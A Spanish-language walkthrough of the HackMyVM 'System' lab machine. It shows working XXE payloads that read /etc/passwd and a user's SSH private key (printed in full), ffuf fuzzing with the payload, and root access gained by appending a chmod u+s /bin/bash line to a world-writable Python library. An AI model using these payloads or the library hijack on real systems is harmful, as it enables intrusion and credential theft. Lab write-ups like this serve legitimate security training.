---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# System HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-20 02:59 EDT
Nmap scan report for 192.168.5.24
Host is up (0.00058s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 27:71:24:58:d3:7c:b3:8a:7b:32:49:d1:c8:0b:4c:ba (RSA)
|   256 e2:30:67:38:7b:db:9a:86:21:01:3e:bf:0e:e7:4f:26 (ECDSA)
|_  256 5d:78:c5:37:a8:58:dd:c4:b6:bd:ce:b5:ba:bf:53:dc (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: HackMyVM Panel
MAC Address: 08:00:27:DE:FD:6B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.19 seconds
```

Veremos que hay un puerto `80` en el que si entramos veremos una pagina web alojada que contiene un panel de `register` probablemente para registrar un usuario, vamos a probar a registrar un usuario a ver que pasa.

```
User: test
Pass: test
```

Veremos que pone esto:

```
test is already registered!
```

Pero no pasa nada mas, vamos abrir `BurpSuite` y capturar la peticion del registro a ver que esta pasando por dentro, pero si inspeccionamos el codigo antes confirmamos esto:

```html
<input type="submit" value="Register" onclick="XMLFunction()">
```

## XXE (RCE)

Vemos que esta llamando a una funcion que tiene que ver con `XML` por lo que tiene toda la pinta de que podremos realizar un `XXE`, vamos a capturar la peticion.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-05-20 090437.png" alt=""><figcaption></figcaption></figure>

Veremos que efectivamente esta utilizando `XML` por lo que vamos a probar a realizar un `XXE` a ver si se ejecuta codigo de forma remota para realizar un `RCE`.

Probaremos esta estructura tipica de un `XXE`.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<details>
	<email>
		&xxe;
	</email>
	<password>
		test
	</password>
</details>
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Vemos que esta funcionando y estaremos leyendo el `passwd` de la maquina victima, por lo que vamos a probar a leer la `id_rsa` del usuario `david` que es el unico que vemos que esta registrado.

```
file:///home/david/.ssh/id_rsa
```

Info:

> id\_rsa

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Veremos que ha funcionado, por lo que vamos a guardarlo en un archivo `id_rsa` y establecerle los permisos necesarios.

```shell
chmod 600 id_rsa
```

Ahora vamos a probar a conectarnos por `SSH`.

```shell
ssh -i id_rsa david@<IP>
```

Si probamos esto veremos que no nos deja ya que no esta habilitado autenticarte mediante la clave `privada` por lo que vamos a realizar un poco de `fuzzing` en la `home` del usuario `david` a ver que entontramos.

## Escalate user david

### FFUF

```shell
ffuf -w quickhits.txt -X POST \
-H "Content-Type: text/plain;charset=UTF-8" \
-d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/david/FUZZ">]><details><email>&xxe;</email><password>test</password></details>' \
-u http://<IP>/magic.php --fs 85
```

Info:

```


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://192.168.5.24/magic.php
 :: Wordlist         : FUZZ: /home/kali/Downloads/quickhits.txt
 :: Header           : Content-Type: text/plain;charset=UTF-8
 :: Data             : <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/david/FUZZ">]><details><email>&xxe;</email><password>test</password></details>
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 85
________________________________________________

.profile                [Status: 200, Size: 892, Words: 138, Lines: 28, Duration: 59ms]
.ssh/id_rsa             [Status: 200, Size: 2687, Words: 17, Lines: 39, Duration: 23ms]
.ssh/id_rsa.pub         [Status: 200, Size: 653, Words: 13, Lines: 2, Duration: 70ms]
.viminfo                [Status: 200, Size: 786, Words: 90, Lines: 39, Duration: 55ms]
:: Progress: [2565/2565] :: Job [1/1] :: 561 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Veremos que encontramos un archivo bastante interesantes llamado `.viminfo` vamos a ver que es y que contiene.

Si vemos que contiene veremos lo siguiente:

```
# This viminfo file was generated by Vim 8.2.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:wq!
|2,0,1648909714,,"wq!"

# Search String History (newest to oldest):

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:

# Password file Created:
'0  1  3  /usr/local/etc/mypass.txt
|4,48,1,3,1648909714,"/usr/local/etc/mypass.txt"

# History of marks within files (newest to oldest):

> /usr/local/etc/mypass.txt
	*	1648909713	0
	"	1	3
	^	1	4
	.	1	3
	+	1	3
 is already registered! 
```

Vemos que en la ruta `/usr/local/etc/mypass.txt` hay algo de una `password` en este caso creemos que puede ser del usuario `david` por lo que vamos a comprobarlo.

Si lo leemos veremos esto:

```
h4ck3rd4v!d
```

Vamos a conectarnos por `SSH` a ver si funciona.

### SSH

```shell
ssh david@<IP>
```

Metemos como contraseña `h4ck3rd4v!d` y veremos que estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
79f3964a3a0f1a050761017111efffe0
```

## Escalate Privileges

Si listamos la carpeta `/opt` veremos lo siguiente:

```
total 12
drwxr-xr-x  2 root root 4096 Apr  2  2022 .
drwxr-xr-x 18 root root 4096 Apr  2  2022 ..
-rw-r--r--  1 root root  563 Apr  2  2022 suid.py
```

Vemos que hay un archivo `.py` vamos a ver que contiene:

```python
from os import system
from pathlib import Path

# Reading only first line
try:
    with open('/home/david/cmd.txt', 'r') as f:
        read_only_first_line = f.readline()
    # Write a new file
    with open('/tmp/suid.txt', 'w') as f:
        f.write(f"{read_only_first_line}")
    check = Path('/tmp/suid.txt')
    if check:
        print("File exists")
        try:
            os.system("chmod u+s /bin/bash")
        except NameError:
            print("Done")
    else:
        print("File not exists")
except FileNotFoundError:
    print("File not exists")
```

Vemos varias cosas interesantes, por lo vemos hay una opcion en la que si detecta el programa que existe un archivo llamado `suid.txt` en la carpeta `/tmp` se establecen permisos de `SUID` a la `bash` de lo contrario no hace nada.

Pero aunque lo creemos el archivo no pasara nada, tambien podemos creer que se esta ejecutando un `crontab` ya que esto tiene pinta de que se esta ejecutando cada `x` tiempo.

Vamos a pasarnos el script `pspy64` a la maquina victima mediante un servidor de `python3` y en la maquina victima con `wget`.

```shell
python3 -m http.server 80
```

Ahora en la maquina victima:

```shell
cd /tmp
wget http://<IP>/pspy64
```

Una vez que nos lo hayamos pasado estableceremos permisos de ejecucion.

```shell
chmod +x pspy64
```

Ahora ejecutaremos dicho script.

```shell
./pspy64
```

Info:

```
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/05/20 03:34:07 CMD: UID=1000  PID=1053   | ./pspy64 
2025/05/20 03:34:07 CMD: UID=0     PID=1021   | 
2025/05/20 03:34:07 CMD: UID=0     PID=976    | 
2025/05/20 03:34:07 CMD: UID=1000  PID=958    | -bash 
2025/05/20 03:34:07 CMD: UID=1000  PID=957    | sshd: david@pts/0    
2025/05/20 03:34:07 CMD: UID=1000  PID=948    | (sd-pam) 
2025/05/20 03:34:07 CMD: UID=1000  PID=947    | /lib/systemd/systemd --user 
2025/05/20 03:34:07 CMD: UID=0     PID=944    | sshd: david [priv]   
2025/05/20 03:34:07 CMD: UID=0     PID=943    | 
2025/05/20 03:34:07 CMD: UID=33    PID=917    | php-fpm: pool www                                                             
2025/05/20 03:34:07 CMD: UID=33    PID=916    | php-fpm: pool www                                                             
2025/05/20 03:34:07 CMD: UID=33    PID=915    | php-fpm: pool www                                                             
2025/05/20 03:34:07 CMD: UID=0     PID=881    | 
2025/05/20 03:34:07 CMD: UID=0     PID=855    | 
2025/05/20 03:34:07 CMD: UID=0     PID=841    | 
2025/05/20 03:34:07 CMD: UID=33    PID=444    | nginx: worker process                            
2025/05/20 03:34:07 CMD: UID=0     PID=443    | nginx: master process /usr/sbin/nginx -g daemon on; master_process on; 
2025/05/20 03:34:07 CMD: UID=0     PID=439    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2025/05/20 03:34:07 CMD: UID=0     PID=438    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2025/05/20 03:34:07 CMD: UID=0     PID=432    | php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)                       
2025/05/20 03:34:07 CMD: UID=0     PID=347    | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3                                                                                                                         
2025/05/20 03:34:07 CMD: UID=0     PID=332    | /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant 
2025/05/20 03:34:07 CMD: UID=0     PID=328    | /lib/systemd/systemd-logind 
2025/05/20 03:34:07 CMD: UID=0     PID=322    | /usr/sbin/rsyslogd -n -iNONE 
2025/05/20 03:34:07 CMD: UID=104   PID=317    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2025/05/20 03:34:07 CMD: UID=0     PID=316    | /usr/sbin/cron -f 
2025/05/20 03:34:07 CMD: UID=0     PID=284    | 
2025/05/20 03:34:07 CMD: UID=0     PID=281    | 
2025/05/20 03:34:07 CMD: UID=0     PID=278    | 
2025/05/20 03:34:07 CMD: UID=0     PID=274    | 
2025/05/20 03:34:07 CMD: UID=0     PID=272    | 
2025/05/20 03:34:07 CMD: UID=0     PID=268    | 
2025/05/20 03:34:07 CMD: UID=0     PID=266    | 
2025/05/20 03:34:07 CMD: UID=0     PID=265    | 
2025/05/20 03:34:07 CMD: UID=0     PID=262    | 
2025/05/20 03:34:07 CMD: UID=0     PID=258    | 
2025/05/20 03:34:07 CMD: UID=101   PID=254    | /lib/systemd/systemd-timesyncd 
2025/05/20 03:34:07 CMD: UID=0     PID=240    | 
2025/05/20 03:34:07 CMD: UID=0     PID=206    | /lib/systemd/systemd-udevd 
2025/05/20 03:34:07 CMD: UID=0     PID=181    | /lib/systemd/systemd-journald 
2025/05/20 03:34:07 CMD: UID=0     PID=147    | 
2025/05/20 03:34:07 CMD: UID=0     PID=146    | 
2025/05/20 03:34:07 CMD: UID=0     PID=110    | 
2025/05/20 03:34:07 CMD: UID=0     PID=109    | 
2025/05/20 03:34:07 CMD: UID=0     PID=108    | 
2025/05/20 03:34:07 CMD: UID=0     PID=107    | 
2025/05/20 03:34:07 CMD: UID=0     PID=106    | 
2025/05/20 03:34:07 CMD: UID=0     PID=105    | 
2025/05/20 03:34:07 CMD: UID=0     PID=104    | 
2025/05/20 03:34:07 CMD: UID=0     PID=66     | 
2025/05/20 03:34:07 CMD: UID=0     PID=65     | 
2025/05/20 03:34:07 CMD: UID=0     PID=62     | 
2025/05/20 03:34:07 CMD: UID=0     PID=52     | 
2025/05/20 03:34:07 CMD: UID=0     PID=51     | 
2025/05/20 03:34:07 CMD: UID=0     PID=50     | 
2025/05/20 03:34:07 CMD: UID=0     PID=49     | 
2025/05/20 03:34:07 CMD: UID=0     PID=48     | 
2025/05/20 03:34:07 CMD: UID=0     PID=47     | 
2025/05/20 03:34:07 CMD: UID=0     PID=46     | 
2025/05/20 03:34:07 CMD: UID=0     PID=45     | 
2025/05/20 03:34:07 CMD: UID=0     PID=44     | 
2025/05/20 03:34:07 CMD: UID=0     PID=43     | 
2025/05/20 03:34:07 CMD: UID=0     PID=25     | 
2025/05/20 03:34:07 CMD: UID=0     PID=24     | 
2025/05/20 03:34:07 CMD: UID=0     PID=23     | 
2025/05/20 03:34:07 CMD: UID=0     PID=22     | 
2025/05/20 03:34:07 CMD: UID=0     PID=21     | 
2025/05/20 03:34:07 CMD: UID=0     PID=20     | 
2025/05/20 03:34:07 CMD: UID=0     PID=19     | 
2025/05/20 03:34:07 CMD: UID=0     PID=18     | 
2025/05/20 03:34:07 CMD: UID=0     PID=17     | 
2025/05/20 03:34:07 CMD: UID=0     PID=15     | 
2025/05/20 03:34:07 CMD: UID=0     PID=14     | 
2025/05/20 03:34:07 CMD: UID=0     PID=13     | 
2025/05/20 03:34:07 CMD: UID=0     PID=12     | 
2025/05/20 03:34:07 CMD: UID=0     PID=11     | 
2025/05/20 03:34:07 CMD: UID=0     PID=10     | 
2025/05/20 03:34:07 CMD: UID=0     PID=9      | 
2025/05/20 03:34:07 CMD: UID=0     PID=8      | 
2025/05/20 03:34:07 CMD: UID=0     PID=6      | 
2025/05/20 03:34:07 CMD: UID=0     PID=4      | 
2025/05/20 03:34:07 CMD: UID=0     PID=3      | 
2025/05/20 03:34:07 CMD: UID=0     PID=2      | 
2025/05/20 03:34:07 CMD: UID=0     PID=1      | /sbin/init 
2025/05/20 03:35:01 CMD: UID=0     PID=1063   | /usr/sbin/CRON -f 
2025/05/20 03:35:01 CMD: UID=0     PID=1064   | /usr/sbin/CRON -f 
2025/05/20 03:35:01 CMD: UID=0     PID=1065   | /bin/sh -c /usr/bin/python3.9 /opt/suid.py 
2025/05/20 03:36:01 CMD: UID=0     PID=1067   | /usr/sbin/CRON -f 
2025/05/20 03:36:01 CMD: UID=0     PID=1068   | /usr/sbin/CRON -f 
2025/05/20 03:36:01 CMD: UID=0     PID=1069   | /bin/sh -c /usr/bin/python3.9 /opt/suid.py 
^CExiting program... (interrupt)
```

Veremos que efectivamente se esta ejecutando por `root` una tarea programada de dicho archivo con `python3.9` por lo que vamos a descargarnos `linpeas.sh` de esta forma para enumerar el sistema.

```shell
cd /tmp
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64
```

Info:

```
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                             
/dev/mqueue                                                                                                                                                  
/dev/shm
/home/david
/run/lock
/run/user/1000
/run/user/1000/systemd
/run/user/1000/systemd/inaccessible
/run/user/1000/systemd/inaccessible/dir
/run/user/1000/systemd/inaccessible/reg
/run/user/1000/systemd/units
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/linpeas_linux_amd64
/tmp/pspy64
/tmp/siud.txt
#)You_can_write_even_more_files_inside_last_directory

/usr/lib/python3.9/os.py
/usr/local/etc/mypass.txt
/var/lib/php/sessions
/var/tmp
```

Veremos esta parte de aqui, en esta seccion vemos esta fila:

```
/usr/lib/python3.9/os.py
```

Vamos a listar dicha libreria de `python`.

```shell
ls -la /usr/lib/python3.9/os.py
```

Info:

```
-rw-rw-rw- 1 root root 39063 Apr  2  2022 /usr/lib/python3.9/os.py
```

Veremos que podemos sobreescribir el archivo y vimos anteriormente que el script que esta ejecutando `root` tiene importada dicha libreria, por lo que vamos hacer lo siguiente:

```shell
nano /usr/lib/python3.9/os.py

#Dentro del nano
.........................<RESTO_DE_CODIGO>........................................
import os
os.system('chmod u+s /bin/bash')
```

Ese fragmento de codigo lo meteremos la final del archivo de `os.py`, ahora solo tendremos que esperar a que se ejecute, esperado un rato vamos a listar la `bash`a ver si funciono.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1234376 Aug  4  2021 /bin/bash
```

Veremos que si ha funcionado, por lo que haremos lo siguiente.

```shell
bash -p
```

Info:

```
bash-5.1# whoami
root
```

Con esto veremos que ya seremos `root` por lo que leeremos la `flag` de `root`.

> root.txt

```
3aa26937ecfcc6f2ba466c14c89b92c4
```
